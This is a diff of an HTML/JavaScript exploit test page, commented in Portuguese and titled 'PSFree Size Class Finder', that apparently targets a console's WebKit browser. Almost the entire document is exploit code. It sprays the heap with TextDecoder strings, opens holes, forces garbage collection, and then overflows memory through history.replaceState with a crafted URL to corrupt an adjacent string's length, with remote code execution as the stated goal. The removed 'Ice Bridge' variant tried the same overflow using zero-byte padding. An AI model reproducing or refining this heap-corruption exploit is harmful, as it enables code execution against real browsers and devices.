@@ -1,35 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>The Ice Bridge (Zero Bypass)</title>
+    <title>PSFree Size Class Finder</title>
     <style>
-        body { background-color: #000; color: #00ffff; font-family: monospace; padding: 20px; }
+        body { background-color: #050505; color: #00ff00; font-family: monospace; padding: 20px; }
         button { 
-            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ffff; background: #111; color: #fff; cursor: pointer; margin-bottom: 10px; 
+            font-size: 22px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-bottom: 15px;
         }
-        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
-        .win { background-color: #00ffff; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; }
+        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; }
+        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.4em; padding: 10px; }
     </style>
 </head>
 <body>
 
-    <h1>The Ice Bridge (Ponte de Zeros)</h1>
-    <p>Tentando neutralizar o StructureID com 0x00 para atingir o Length.</p>
+    <h1>Size Class Finder</h1>
+    <p>Descobrindo o menor tamanho que ativa o bug para facilitar o RCE.</p>
 
-    <button onclick="startIceBridge(4)">PONTE DE 4 BYTES (Cobre ID)</button>
-    <button onclick="startIceBridge(8)">PONTE DE 8 BYTES (Cobre ID + Flags)</button>
-    <button onclick="startIceBridge(12)">PONTE DE 12 BYTES</button>
-    <button onclick="startIceBridge(16)">PONTE DE 16 BYTES</button>
-
-    <div id="log">Pronto. Reinicie o console.</div>
+    <button onclick="runTest(65536)">TESTAR 64 KB</button>
+    <button onclick="runTest(32768)">TESTAR 32 KB</button>
+    <button onclick="runTest(16384)">TESTAR 16 KB</button>
+    
+    <div id="log">Pronto. Reinicie o console antes de cada teste.</div>
 
     <script>
-        const BASE_OFFSET = 709522; // O último byte seguro antes do muro
-        const OVERFLOW_AMT = 1024 * 64; 
-
-        // Alvo: 1MB TextDecoder (O que sabemos que alinha)
-        const TARGET_SIZE = 1024 * 1024; 
-        const PAYLOAD_SIZE = TARGET_SIZE - 24; 
+        // CONFIGURAÇÕES
+        // Overflow proporcional ao tamanho (metade do tamanho do objeto)
+        // Isso evita destruir o heap inteiro
+        let current_overflow_amt = 0;
 
         var victims = [];
 
@@ -40,46 +37,65 @@
             el.scrollTop = el.scrollHeight;
         }
 
-        async function startIceBridge(zeroCount) {
-            log(`--- TESTANDO PONTE DE ${zeroCount} ZEROS ---`);
+        async function runTest(sizeBytes) {
+            let sizeKB = sizeBytes / 1024;
+            log(`----------------------------------------`);
+            log(`INICIANDO TESTE: CLASSE ${sizeKB} KB`);
             
-            // 1. PREPARAR HEAP (Spray de Sucesso)
+            // 1. Calcular Offset Base
+            // Assumimos que o "Header" da String é ~24 bytes.
+            // Se queremos encher um bloco de 64KB, nossa string tem que ter (64KB - 24).
+            const PAYLOAD_SIZE = sizeBytes - 24;
+            
+            // O Offset de disparo deve ser exatamente o tamanho do payload
+            // para começar a escrever no vizinho.
+            const SHOOT_OFFSET = PAYLOAD_SIZE;
+            
+            // Ajusta o overflow para ser seguro (50% do tamanho do bloco)
+            current_overflow_amt = sizeBytes / 2;
+
+            log(`Payload Alvo: ${PAYLOAD_SIZE} bytes`);
+            log(`Offset de Tiro Estimado: ${SHOOT_OFFSET}`);
+            log(`Overflow: ${current_overflow_amt} bytes`);
+
+            // 2. Preparar Vítimas (TextDecoder 8-bit)
             victims = [];
             await forceGC();
 
             try {
                 let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
-                rawBuffer.fill(0x42); 
+                rawBuffer.fill(0x42); // 'B'
                 let decoder = new TextDecoder("utf-8");
                 let baseString = decoder.decode(rawBuffer);
 
-                const SPRAY_COUNT = 80;
+                // Spray mais denso porque os objetos são menores
+                const SPRAY_COUNT = 200; 
+                
+                log(`Alocando ${SPRAY_COUNT} strings de ${sizeKB} KB...`);
                 for(let i=0; i<SPRAY_COUNT; i++) {
+                    // Prefixo curto para não alterar muito o tamanho
                     let s = i + "_" + baseString.substring((i+"_").length);
                     victims.push(s);
                 }
 
-                // Buracos
+                // 3. Buracos
+                log("Criando buracos...");
                 for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
+                
                 await forceGC();
 
-                // 2. EXPLOIT COM PONTE
-                log("Disparando Overflow com Zeros...");
+                // 4. Exploit
+                log("Disparando Overflow...");
                 setTimeout(() => {
                     try {
-                        // A: Base Segura
-                        let buffer = "A".repeat(BASE_OFFSET);
+                        // Monta o ataque
+                        let buffer = "A".repeat(SHOOT_OFFSET);
+                        // Adiciona o bypass 0x01
+                        buffer += "\x01".repeat(current_overflow_amt);
                         
-                        // B: A Ponte (Zeros para acalmar o StructureID)
-                        // \u0000 é 1 byte em strings 8-bit
-                        buffer += "\u0000".repeat(zeroCount); 
-                        
-                        // C: A Carga (0x01 para corromper o Length que vem depois)
-                        buffer += "\x01".repeat(OVERFLOW_AMT);
-                        
-                        history.pushState({}, "ice_pwn", "/" + buffer);
+                        history.replaceState({}, "size_test", "/" + buffer);
 
-                        checkVictims(PAYLOAD_SIZE, zeroCount);
+                        checkResults(PAYLOAD_SIZE);
 
                     } catch (e) {
                         log("Erro: " + e.message);
@@ -91,7 +107,7 @@
             }
         }
 
-        function checkVictims(expectedLen, zCount) {
+        function checkResults(expectedLen) {
             let success = false;
             for(let i=1; i<victims.length; i+=2) {
                 let s = victims[i];
@@ -101,28 +117,30 @@
                     let err = new Error(s);
                     let msg = err.message;
 
-                    // SUCESSO (RCE)
+                    // SUCESSO 1: LENGTH
                     if (msg.length !== expectedLen) {
-                        log(`!!! JACKPOT !!! Length Corrompido com ${zCount} zeros!`, 'win');
+                        log(`!!! JACKPOT !!! Length Corrompido na Vítima ${i}!`, 'win');
                         log(`Novo Tamanho: ${msg.length}`, 'win');
-                        alert("RCE UNLOCKED!");
+                        alert(`RCE POSSÍVEL COM ${expectedLen + 24} BYTES!`);
                         success = true;
                         break;
                     }
 
-                    // Se vimos dados corrompidos, o zero passou mas não pegou o length
+                    // SUCESSO 2: DADOS
                     if (msg.charCodeAt(0) === 1) {
-                         log(`[Aviso] Atingiu DADOS. A ponte de ${zCount} zeros foi curta demais?`);
+                        log(`[SUCESSO PARCIAL] Dados corrompidos com tamanho ${expectedLen + 24}.`, 'win');
+                        log(`O alinhamento está correto. Falta ajustar para pegar o Header.`);
+                        success = true;
+                        break;
                     }
-                    
                 } catch(e) {}
             }
-            if(!success) log("Nada aconteceu. Tente outra ponte.");
+            if(!success) log("Nada atingido. Tente outro tamanho ou reinicie.");
         }
 
         async function forceGC() {
             try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
-            return new Promise(r => setTimeout(r, 800));
+            return new Promise(r => setTimeout(r, 500));
         }
     </script>
 </body>
